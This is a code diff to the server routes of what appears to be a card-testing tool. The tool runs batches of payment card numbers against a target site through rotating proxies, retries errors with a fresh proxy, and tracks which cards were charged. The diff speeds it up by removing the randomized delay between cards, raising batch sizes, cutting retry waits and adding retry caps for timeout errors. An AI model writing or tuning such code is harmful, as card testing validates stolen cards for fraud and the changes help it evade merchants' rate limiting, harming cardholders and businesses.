@@ -227,6 +227,8 @@ export async function registerRoutes(
         /internal server error/,
         /ip_rate_limited/,
         /rate_limited/,
+        /temporarily unavailable/,
+        /timeout/,
       ];
       const isHardError = !apiMsg || HARD_ERROR_RE.some((re) => re.test(apiMsg));
 
@@ -317,7 +319,7 @@ export async function registerRoutes(
       [allCards[i], allCards[j]] = [allCards[j], allCards[i]];
     }
 
-    const BATCH_SIZE = Math.min(Math.max(Math.ceil(allCards.length / 5), 1), 20);
+    const BATCH_SIZE = Math.min(Math.max(Math.ceil(allCards.length / 3), 1), 30);
 
     broadcastToUser(userId, { type: WS_EVENTS.STATUS_UPDATE, payload: { active: true, processed: 0, total: allCards.length } });
     broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `Starting check on ${targetUrl}...`, type: 'info' } });
@@ -340,11 +342,6 @@ export async function registerRoutes(
           return { success: false, stopped: true, charged: false };
         }
 
-        if (idx > 0) {
-          const delay = 250 + Math.random() * 500;
-          await new Promise(r => setTimeout(r, delay));
-        }
-
         const proxyIndex = (i + idx) % (proxies.length || 1);
 
         if (isCardExpired(cardStr)) {
@@ -361,10 +358,17 @@ export async function registerRoutes(
           return { success: true, stopped: false, charged: false };
         }
 
-        // Process valid card with API - retry on any error (rate-limited responses max 4x, others up to 40x)
+        // Process valid card with API - retry by error type (temporarily unavailable/timeout max 2x, rate-limited max 4x, others up to 40x)
         try {
           const MAX_ATTEMPTS = 40;
           const RATE_LIMIT_ATTEMPTS = 4;
+          const TEMP_ATTEMPTS = 2;
+          const retryCap = (msg: string) => {
+            const m = msg.toLowerCase();
+            if (/ip_rate_limited|rate_limited/.test(m)) return RATE_LIMIT_ATTEMPTS;
+            if (/temporarily unavailable|timeout/.test(m)) return TEMP_ATTEMPTS;
+            return MAX_ATTEMPTS;
+          };
           let attempt = 0;
           let result: Awaited<ReturnType<typeof checkCardWithAPI>> = { status: 'error', message: 'No attempt made' };
           let allowedAttempts = MAX_ATTEMPTS;
@@ -375,10 +379,9 @@ export async function registerRoutes(
             const attemptProxy = proxies[(proxyIndex + attempt - 1) % (proxies.length || 1)] || '';
 
             if (attempt > 1) {
-              const isRateLimited = /ip_rate_limited|rate_limited/.test(String(result.message || '').toLowerCase());
-              allowedAttempts = isRateLimited ? RATE_LIMIT_ATTEMPTS : MAX_ATTEMPTS;
+              allowedAttempts = retryCap(result.message || '');
               broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] Error - retry ${attempt}/${allowedAttempts} with new proxy...`, type: 'info' } });
-              await new Promise(r => setTimeout(r, 500));
+              await new Promise(r => setTimeout(r, 300));
             }
 
             result = await checkCardWithAPI(cardStr, targetUrl, attemptProxy, (msg) => {
@@ -386,8 +389,7 @@ export async function registerRoutes(
               broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] ${msg}`, type: 'info' } });
             }, stopSignal);
 
-            const isRateLimited = /ip_rate_limited|rate_limited/.test(String(result.message || '').toLowerCase());
-            allowedAttempts = isRateLimited ? RATE_LIMIT_ATTEMPTS : MAX_ATTEMPTS;
+            allowedAttempts = retryCap(result.message || '');
           } while (result.status === 'error' && attempt < allowedAttempts && !job.shouldStop);
 
           if (job.shouldStop || result?.message?.includes('[STOPPED]')) {
